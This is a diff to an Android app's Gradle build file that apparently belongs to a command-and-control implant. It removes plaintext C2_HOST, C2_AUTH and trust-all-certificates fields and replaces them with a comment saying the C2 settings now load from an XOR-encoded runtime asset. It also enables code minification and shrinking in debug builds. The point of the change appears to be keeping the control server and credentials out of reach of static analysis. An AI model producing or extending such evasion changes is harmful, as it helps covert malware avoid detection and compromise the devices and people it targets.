@@ -12,18 +12,21 @@ android {
         targetSdk 34
         versionCode 1
         versionName "1.0"
-
-        // ── C2 config — change before building ───────────────────────────────
-        buildConfigField "String",  "C2_HOST",    '"https://192.168.1.100:4444"'
-        buildConfigField "String",  "C2_AUTH",    '"changeme"'
-        buildConfigField "boolean", "TRUST_ALL",  "true"   // set false when using real cert
+        // C2 config is loaded from assets/config.json at runtime (XOR-encoded)
+        // — no plaintext strings baked into BuildConfig
     }
 
-    buildFeatures { buildConfig true }
+    buildFeatures { buildConfig false }
 
     buildTypes {
+        debug {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
         release {
             minifyEnabled true
+            shrinkResources true
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
         }
     }
